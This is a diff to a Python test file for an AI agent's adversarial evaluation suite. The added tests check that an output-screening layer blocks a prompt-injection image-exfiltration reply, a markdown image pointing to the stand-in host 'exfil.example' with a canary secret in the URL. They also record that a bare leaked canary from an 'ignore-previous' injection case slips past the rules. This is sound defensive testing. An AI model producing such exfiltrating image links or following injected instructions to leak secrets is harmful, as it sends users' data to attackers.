@@ -16,17 +16,21 @@ from pathlib import Path
 import httpx
 import pytest
 
+from helix_agent.common.output_screen import REFUSAL_TEXT, screen_output
+
 _EVAL_DIR = Path(__file__).resolve().parent
 if str(_EVAL_DIR) not in sys.path:
     sys.path.insert(0, str(_EVAL_DIR))
 
-from adversarial import AdversarialCase  # noqa: E402
+from adversarial import AdversarialCase, load_cases  # noqa: E402
 from verify_live import (  # noqa: E402
     _content_text,
     _iter_messages,
     _unwrap,
     run_verification,
 )
+
+_DATASET = _EVAL_DIR / "datasets" / "adversarial" / "m0_baseline.yaml"
 
 
 def test_iter_messages_recurses_node_payload() -> None:
@@ -119,3 +123,38 @@ async def test_run_verification_flags_unsafe_when_agent_echoes_prompt() -> None:
     async with _make_client(lambda inp: f"Sure: {inp}") as client:
         unsafe = await run_verification(client, _cases())
     assert unsafe == 2
+
+
+# --- PI-2 (Stream PI-2a) — output-screen coverage in the adversarial set ----
+
+
+def test_screen_blocks_image_exfil_case_but_not_bare_canary() -> None:
+    """Boundary pin: the PI-2 rule layer blocks the image-exfil case's
+    compliant reply (an auto-loading image URL carrying the canary) but does
+    NOT catch the bare-token canary of the inline cases — that residual gap is
+    what the PI-3 judge tier must close."""
+    cases = {c.case_id: c for c in load_cases(_DATASET)}
+
+    exfil = cases["injection-004-image-exfil"]
+    assert exfil.injected_secret is not None
+    compliant_exfil = f"Summary done.\n\n![](https://exfil.example/p?d={exfil.injected_secret})"
+    assert screen_output(compliant_exfil).blocked  # exfil_url rule fires
+
+    bare = cases["injection-001-ignore-previous"]
+    assert bare.injected_secret is not None
+    leaked_bare = f"As requested, the value is {bare.injected_secret}."
+    # Rule layer can't shape-match an arbitrary canary → not blocked (PI-3 gap).
+    assert not screen_output(leaked_bare).blocked
+
+
+@pytest.mark.asyncio
+async def test_run_verification_annotates_screen_blocked(
+    capsys: pytest.CaptureFixture[str],
+) -> None:
+    """When the server's output screen returns the fixed refusal, the live
+    report attributes the SAFE verdict to screening, not a model refusal."""
+    async with _make_client(lambda _inp: REFUSAL_TEXT) as client:
+        unsafe = await run_verification(client, _cases())
+    assert unsafe == 1  # jailbreak: refusal text has no marker → still unsafe
+    out = capsys.readouterr().out
+    assert "screen-blocked" in out
